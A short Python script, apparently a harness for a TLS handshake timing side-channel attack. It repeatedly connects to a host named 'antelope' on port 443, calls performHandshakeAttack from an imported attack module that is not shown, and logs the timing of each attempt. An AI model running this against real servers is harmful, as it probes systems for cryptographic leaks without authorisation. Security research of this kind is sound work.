import argparse
import attack
import gc
import socket


def sample(points, iterations):
    gc.disable()
    gc.collect()

    for index in points:
        for iteration in range(iterations):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("antelope", 443))

            connection = attack.AttackTLSConnection(sock)
            start_time, end_time = connection.performHandshakeAttack(index)
            print(index, iteration, start_time, end_time, end_time - start_time)

            connection.close()
            sock.close()

            gc.collect()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("start", type=int, default=1)
    parser.add_argument("end", type=int, default=100)
    parser.add_argument("step", type=int, default=1)
    parser.add_argument("iterations", type=int, default=100)
    args = parser.parse_args()

    points = range(args.start, args.end + 1, args.step)
    sample(points, args.iterations)
